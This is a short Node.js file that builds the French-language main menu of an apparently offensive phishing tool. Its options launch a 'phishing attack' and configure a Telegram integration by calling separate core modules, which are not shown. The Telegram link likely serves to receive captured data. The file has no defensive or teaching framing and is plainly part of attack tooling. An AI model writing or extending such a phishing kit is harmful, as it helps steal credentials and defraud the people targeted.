const inquirer = require('inquirer');
const chalk = require('chalk');
const phishCore = require('../core/phishing');
const telegram = require('../core/telegram');

const showMainMenu = async () => {
  const { action } = await inquirer.prompt([
    {
      type: 'list',
      name: 'action',
      message: 'Menu Principal:',
      choices: [
        { name: '🔍 Lancer l\'attaque de phishing', value: 'start_phishing' },
        { name: '⚙️  Configurer Telegram', value: 'setup_telegram' },
        { name: '❌ Quitter', value: 'exit' }
      ]
    }
  ]);

  switch (action) {
    case 'start_phishing':
      await phishCore.startPhishing();
      break;
    case 'setup_telegram':
      await telegram.setupTelegram();
      break;
    case 'exit':
      process.exit(0);
  }
};

module.exports = { showMainMenu };
